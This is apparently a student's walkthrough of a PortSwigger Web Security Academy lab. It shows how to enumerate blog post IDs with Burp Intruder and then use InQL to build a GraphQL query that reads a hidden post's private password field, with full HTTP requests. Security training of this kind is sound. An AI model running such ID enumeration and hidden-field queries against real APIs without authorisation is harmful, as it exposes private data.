# Lab: Accessing private GraphQL posts

**Level: APPRENTICE**

### The blog page for this lab contains a hidden blog post that has a secret password.

### To solve the lab, find the hidden blog post and enter the password.

>We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

**Go to the lab:**
https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

**For more information on using InQL, see** [Working with GraphQL in Burp Suite.](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql)


**Download the extension here ->** [InQL Scanner BApp Store](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)

---

**Solution**

There are different ways, but I liked this one:

1. Browse the site, clicking on various posts
2. check the proxy history in Burp Suite & notice each one is numbered
3. Since the goal is to find the missing blog post and password, you can do this manually to determine which is absent
4. OR
5. Send one of those `GET /post?postId=1` request to the intruder
6. higlight the post ID number, select a number payload, do **1 -10**, steb by **1**
8. run the attack and notice the response codes
9. Post Id's 1-2 have a response status code of 200
10. 4&5 have 200 response codes
11. But 3 has a 404 not found response
12. and anything 6 and up has a 400

Therefore, `GET /post?postId=3` is the hidden one you need to reveal

So How do you do that?

Send one of the GraphQL queries `POST /graphql/v1`  `web-security-academy.net/graphql/v1` to the repeater.

The request should look like this:

```HTTP
POST /graphql/v1 HTTP/2
Host: 0a3d00730319c7918190935f002e00b5.web-security-academy.net
Cookie: session=D2XpAN8wg0l2tfdFMV0X6DcQUPGWieHx
Content-Length: 150
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://0a3d00730319c7918190935f002e00b5.web-security-academy.net
Referer: https://0a3d00730319c7918190935f002e00b5.web-security-academy.net/post?postId=2
Priority: u=1, i

{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n        }\n    }",
"operationName":"getBlogPost",
"variables":{
  "id":2
  }
}

```


then, 
**Right-click on the request, select extensions -> InQL Graph Scanner -> Generate Queries with InQL Scanner**


 Now click on the InQL tab and scan the URL that you just sent there. 
 
 It should be this one:
 `web-security-academy.net/graphql/v1`
 
 Click Analyze, and open the `getBlogPosts.graphql` page and send it to repeater.
 Once that request is in the repeater request tab. 
 
 It should look like this:
```HTTP
POST /graphql/v1 HTTP/2
Host: 0a3d00730319c7918190935f002e00b5.web-security-academy.net
Content-Type: application/json
Content-Length: 228

{"query": "query {\n    getBlogPost(id: Int!) {\n        author\n        date # Timestamp scalar\n        id\n        image\n        isPrivate\n        paragraphs\n        postPassword\n        summary\n        title\n    }\n}"}

```
**Change the Int!** in the `getBlogPost(id: Int!)` query to `3` and send it.
The response should be the 3rd post, and the `"postPassword": "itsarandomstringoftext",`
will be at the bottom

**The edited request**
```HTTP
POST /graphql/v1 HTTP/2
Host: 0a3d00730319c7918190935f002e00b5.web-security-academy.net
Content-Type: application/json
Content-Length: 225

{"query": "query {\n    getBlogPost(id: 3) {\n        author\n        date # Timestamp scalar\n        id\n        image\n        isPrivate\n        paragraphs\n        postPassword\n        summary\n        title\n    }\n}"
}

```

**The response will be the third post and the** "postPassword": "stringoftext", will be at the bottom
<br>
